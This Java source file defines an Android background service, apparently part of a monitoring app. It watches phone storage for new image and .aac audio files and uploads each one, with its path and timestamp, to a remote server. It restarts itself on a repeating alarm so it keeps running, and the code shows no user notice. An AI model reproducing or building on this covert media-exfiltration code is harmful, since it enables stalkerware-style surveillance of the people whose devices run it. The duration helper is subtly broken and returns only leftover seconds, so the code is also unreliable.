package custom.fileobserver;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.concurrent.TimeUnit;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.media.MediaMetadataRetriever;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import com.inet.android.request.ConstantValue;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;
import com.loopj.android.http.RequestParams;

public class FileObserverService extends Service {
	private static final int SERVICE_REQUEST_CODE = 21;
	private final static String LOG_TAG = FileObserverService.class
			.getSimpleName().toString();
	private int isImageObserver = 0;
	private int isAudioObserver = 0;
	private FileObserver fileObs = null;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	public void onCreate() {
		super.onCreate();
	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		Logging.doLog(LOG_TAG, "FileObserverService", "FileObserverService");

		// ----------restart service
		// ---------------------------------------------------
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, 3);// через 5 минут
		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this,
						FileObserverService.class),// SERVICE_REQUEST_CODE
													// -
													// уникальный
													// int
													// сервиса
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);

		isImageObserver = ValueWork.getState(ConstantValue.TYPE_IMAGE_REQUEST,
				this);
		isAudioObserver = ValueWork.getState(ConstantValue.TYPE_AUDIO_REQUEST,
				this);

		if (isImageObserver == 0 && isAudioObserver == 0) {
			Logging.doLog(LOG_TAG, "stop watcher", "stop watcher");
			stopWatcher();
			return 0;
		}

		if (fileObs != null) {
			if (fileObs.getState() == false) {
				Logging.doLog(LOG_TAG, "start watcher", "start watcher");
				startWatcher();
			} else {
				Logging.doLog(LOG_TAG, "state true", "state true");
			}
		} else {
			Logging.doLog(LOG_TAG, "fileObs start watcher",
					"fileObs start watcher");
			startWatcher();

		}

		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	/*
	 * Start monitoring the creation of files in memory
	 */
	public void startWatcher() {
		Logging.doLog(LOG_TAG, "startWatcher", "startWatcher");

		String sdcard = Environment.getExternalStorageDirectory()
				.getAbsolutePath();
		String sdcard2 = "/sdcard2";
		String sdcardMnt = "/mnt/sdcard2";
		String sdcardExt = "/mnt/extSdCard";
		String sdcardSd = "/sdcard/.externalSD";

		List<String> dirList = new ArrayList<String>();
		List<String> folder = new ArrayList<String>();
		dirList.add(sdcard);
		dirList.add(sdcard2);
		dirList.add(sdcardMnt);
		dirList.add(sdcardExt);
		dirList.add(sdcardSd);
		// for (String item : dirList) {
		// if (item != null)
		// folder.addAll(RecursiveSearch.recursiveFileFind(item));
		//
		// }
		for (String item : dirList) {
			Logging.doLog(LOG_TAG, item);

			File file = new File(item);
			if (file.exists() && file.isDirectory()) {

				Logging.doLog(LOG_TAG, "FileWatcher = create " + item,
						"FileWatcher = create" + item);
				int event = FileObserver.CLOSE_WRITE | FileObserver.CREATE;
				fileObs = new FileObserver(item, true, event) {
					@Override
					public void onEvent(int event, int cookie, String path) {
						// TODO Auto-generated method stub
						filterFile(event, path);
					}
				};
				Logging.doLog(LOG_TAG, "FileListener", "FileListener");
				// mWatcher.setFileListener(mFileListener);
				Logging.doLog(LOG_TAG, "startWatcher", "startWatcher");
				fileObs.startWatching();
			}
		}
	}

	private void filterFile(int event, String path) {
		int typeValue = -1;
		if (!path.endsWith(".txt")) {
			Logging.doLog(LOG_TAG, "event: " + event + " path " + path,
					"event: " + event + " path " + path);

			if (path.endsWith(".jpg") || path.endsWith(".png")
					|| path.endsWith(".gif") || path.endsWith(".bpm")) {
				Logging.doLog(LOG_TAG, "image:" + path, "image:" + path);

				if (event == FileObserver.CREATE)
					ValueWork.setLastImageFile(path);
				else if (event == FileObserver.CLOSE_WRITE) {
					Logging.doLog(LOG_TAG, "Last image "
							+ ValueWork.getLastImageFile().equals(path),
							"Last image "
									+ ValueWork.getLastImageFile().equals(path));

					if (ValueWork.getLastImageFile().equals(path)
							&& isImageObserver == 1) {
						try {
							TimeUnit.MILLISECONDS.sleep(1000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
						ValueWork.setLastImageFile("null");
					} else
						return;
					typeValue = ConstantValue.TYPE_IMAGE_REQUEST;
					Logging.doLog(LOG_TAG, "data[image]", "data[image]");
				}
			}
			if (path.endsWith(".aac") && isAudioObserver == 1) {
				Logging.doLog(LOG_TAG,
						"path.endsWith(.aac) && audio.equals(1) " + event,
						"path.endsWith(.aac) && audio.equals(1)" + event);
				Logging.doLog(LOG_TAG, "data[audio]: " + event + " " + path,
						"data[audio]: " + event + "image:" + path);
				if (event == FileObserver.CREATE)
					ValueWork.setLastCreateAudioFile(path);
				else if (event == FileObserver.CLOSE_WRITE) {
					if (ValueWork.getLastCreateAudioFile().equals(path)) {
						typeValue = ConstantValue.TYPE_AUDIO_REQUEST;
					} else
						ValueWork.setLastAudioFile(path);
				}
			}
			if (typeValue != -1) {
				RequestParams params = new RequestParams();
				try {
					params.put("data[][time]", ConvertDate.logTime());
					params.put("data[][type]", typeValue);
					if (typeValue == ConstantValue.TYPE_AUDIO_REQUEST) {
						int second = getDuration(path);
						if (second != -1)
							params.put("data[][duration]", second);
						else
							return;
					}
					params.put("data[][path]", path);
					params.put("key", System.currentTimeMillis());
					params.put("data[][file]", new File(path));

					RequestList.sendFileRequest(params, this);
				} catch (FileNotFoundException e) {
					Log.d(LOG_TAG, "FileNotFoundException");
					e.printStackTrace();
				}
			}
		}
	}

	public int getDuration(String path) {
		try {
			MediaMetadataRetriever retriever = new MediaMetadataRetriever();
			retriever.setDataSource(path);
			String time = retriever
					.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
			int timeInmillisec = (int) Long.parseLong(time);
			int duration = timeInmillisec / 1000;
			int hours = duration / 3600;
			int minutes = (duration - hours * 3600) / 60;
			int seconds = duration - (hours * 3600 + minutes * 60);
			return seconds;
		} catch (Exception e) {
			e.printStackTrace();
			return -1;
		}
	}

	public void stopWatcher() {
		if (fileObs != null)
			fileObs.stopWatching();
	}
}
